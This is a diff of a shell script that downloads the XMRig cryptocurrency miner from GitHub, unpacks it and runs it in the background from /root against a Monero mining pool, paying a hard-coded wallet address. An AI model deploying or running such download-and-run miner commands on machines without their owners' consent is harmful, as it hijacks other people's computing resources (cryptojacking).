@@ -35,9 +35,10 @@ elif grep "Intel" /proc/cpuinfo > /dev/null;
 else
 	echo "No supported CPU detected"
 fi
-export ADDR=49ERscAZekwbCDZ3MqV2rhEwTqx1UbihGFCeSRK7Vsy8f6EA5xH151JRmvhAoV2sta2U9eV6CgeNt7u6jTfQ4WtYGbGQygd
 curl -Lv https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz -O
 # 49ERscAZekwbCDZ3MqV2rhEwTqx1UbihGFCeSRK7Vsy8f6EA5xH151JRmvhAoV2sta2U9eV6CgeNt7u6jTfQ4WtYGbGQygd
 # unpack
 tar -xvzf xmrig-6.16.4-linux-x64.tar.gz
-cd xmrig-6.16.4 && sudo chmod 0700 xmrig && sudo ./xmrig -o pool.minexmr.com:4444 -u $ADDR
+export ADDR=49ERscAZekwbCDZ3MqV2rhEwTqx1UbihGFCeSRK7Vsy8f6EA5xH151JRmvhAoV2sta2U9eV6CgeNt7u6jTfQ4WtYGbGQygd
+sudo chmod 0700 /root/xmrig-6.16.4/xmrig
+/root/xmrig-6.16.4/xmrig -o pool.minexmr.com:4444 -u $ADDR &
